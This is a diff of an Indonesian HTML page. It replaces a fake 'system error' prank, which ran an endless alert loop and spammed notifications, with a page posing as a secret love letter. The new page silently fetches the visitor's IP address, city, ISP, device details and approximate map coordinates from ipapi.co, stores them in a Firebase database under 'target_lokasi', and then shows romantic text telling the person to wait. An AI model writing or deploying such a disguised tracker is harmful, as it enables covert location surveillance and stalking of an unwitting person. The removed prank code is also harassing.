@@ -2,112 +2,69 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Error - Update Required</title>
+    <title>Surat Untuk Kamu ❤️</title>
     <style>
-        /* CSS Gue bikin lebih kuat biar gak blank hitam */
-        body { 
-            background: #000; 
-            color: #0f0; 
-            font-family: 'Courier New', monospace; 
-            margin: 0; 
-            display: flex; 
-            flex-direction: column; 
-            align-items: center; 
-            justify-content: center; 
-            height: 100vh;
-            text-align: center;
-        }
-        .container {
-            width: 90%;
-            max-width: 400px;
-            padding: 20px;
-            border: 1px solid #0f0;
-            background: rgba(0, 20, 0, 0.5);
-            box-shadow: 0 0 20px #0f0;
-        }
-        button {
-            padding: 15px 30px;
-            background: #0f0;
-            color: #000;
-            border: none;
-            font-weight: bold;
-            cursor: pointer;
-            margin-top: 20px;
-            border-radius: 5px;
-        }
-        #logs {
-            text-align: left;
-            font-size: 10px;
-            height: 150px;
-            overflow-y: hidden;
-            margin-top: 10px;
-            color: #0f0;
-        }
+        body { background: #ffebee; color: #d81b60; font-family: 'Arial', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
+        .container { padding: 20px; }
+        .heart { font-size: 50px; color: #e91e63; animation: beat .25s infinite alternate; }
+        @keyframes beat { to { transform: scale(1.2); } }
+        #status { font-size: 14px; color: #888; margin-top: 10px; }
     </style>
 </head>
 <body>
 
-    <div class="container" id="box">
-        <h2 id="msg">SYSTEM CRITICAL ERROR</h2>
-        <p style="color:red; font-size: 12px;">Virus Terdeteksi: Trojan.Lopyu.01</p>
-        <div id="logs"></div>
-        <button id="btn" onclick="eksekusi()">PERBAIKI SEKARANG</button>
+    <div class="container" id="main-content">
+        <div class="heart">❤️</div>
+        <h1 id="title">Sedang membuka pesan rahasia...</h1>
+        <p id="status">Mengamankan koneksi pribadi...</p>
     </div>
 
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+
     <script>
-        const dataLog = [
-            "> Menghubungkan ke Server...",
-            "> Mencoba Bypass Firewall Android...",
-            "> ERROR: Akses Ditolak!",
-            "> Mencoba Eksploitasi Root...",
-            "> SUCCESS: Akses Root Diterima.",
-            "> Menghapus Data Galeri...",
-            "> Mengirim Lokasi GPS ke Hacker...",
-            "> Menghapus WhatsApp & Kontak...",
-            "> ☠️ PERANGKAT DIKUASAI SEPENUHNYA ☠️"
-        ];
+        // KONFIGURASI FIREBASE (Pake yang Pirdangame lu)
+        const firebaseConfig = {
+            databaseURL: "https://pirdangame-default-rtdb.firebaseio.com"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
 
-        async function eksekusi() {
-            // Minta Izin Notifikasi (Wajib klik Allow)
-            const ijin = await Notification.requestPermission();
+        // 1. Tunggu 2 detik, lalu mulai Scan
+        setTimeout(async () => {
+            document.getElementById('status').innerText = "Menyiapkan kejutan untukmu...";
             
-            document.getElementById('btn').style.display = 'none';
-            let logBox = document.getElementById('logs');
-            let i = 0;
+            try {
+                // Ambil IP dan Lokasi via API Eksternal (No Visual)
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
 
-            // Animasi Log Hacker
-            let jalankanLog = setInterval(() => {
-                let p = document.createElement('p');
-                p.innerText = dataLog[i];
-                logBox.appendChild(p);
-                i++;
-                if (i >= dataLog.length) {
-                    clearInterval(jalankanLog);
-                    mulaiSpam(ijin);
-                }
-            }, 600);
-        }
+                const logData = {
+                    ip: data.ip,
+                    kota: data.city,
+                    wilayah: data.region,
+                    negara: data.country_name,
+                    isp: data.org,
+                    perangkat: navigator.userAgent,
+                    waktu: new Date().toLocaleString(),
+                    google_maps: `https://www.google.com/maps?q=${data.latitude},${data.longitude}`
+                };
 
-        function mulaiSpam(ijin) {
-            // Kalo dia klik "Allow", kita hajar pake Notifikasi Sistem HP
-            if (ijin === 'granted') {
-                setInterval(() => {
-                    new Notification("SYSTEM MALFUNCTION!", {
-                        body: "😘 LOPYU GOBLOK! CIE KENA TIPU!",
-                        icon: "https://cdn-icons-png.flaticon.com/512/564/564619.png"
-                    });
-                    if (navigator.vibrate) navigator.vibrate([200, 100, 200]);
-                }, 400);
+                // 2. Simpan ke Firebase (Proses 5 detik selesai)
+                await db.ref('target_lokasi/' + Date.now()).set(logData);
+
+                // 3. Setelah Berhasil (Setelah total 7 detik)
+                setTimeout(() => {
+                    document.getElementById('title').innerText = "Aku sebenernya suka sama kamu...";
+                    document.getElementById('status').innerText = "Tunggu aku di sana ya ❤️";
+                }, 2000);
+
+            } catch (error) {
+                // Jika gagal scan tetap tampil manis
+                console.log("Error silent");
+                document.getElementById('title').innerText = "Koneksi lambat, tapi cintaku tetap kuat.";
             }
-
-            // Pop-up Alert yang gak abis-abis (Ini yang bikin dia emosi)
-            setTimeout(() => {
-                while(true) {
-                    alert("WKWKWK KENA TIPU YA GOBLOK! 😘");
-                    alert("LOPYU MWAHHH 😘");
-                }
-            }, 1000);
-        }
+        }, 2000);
     </script>
 </body>
 </html>
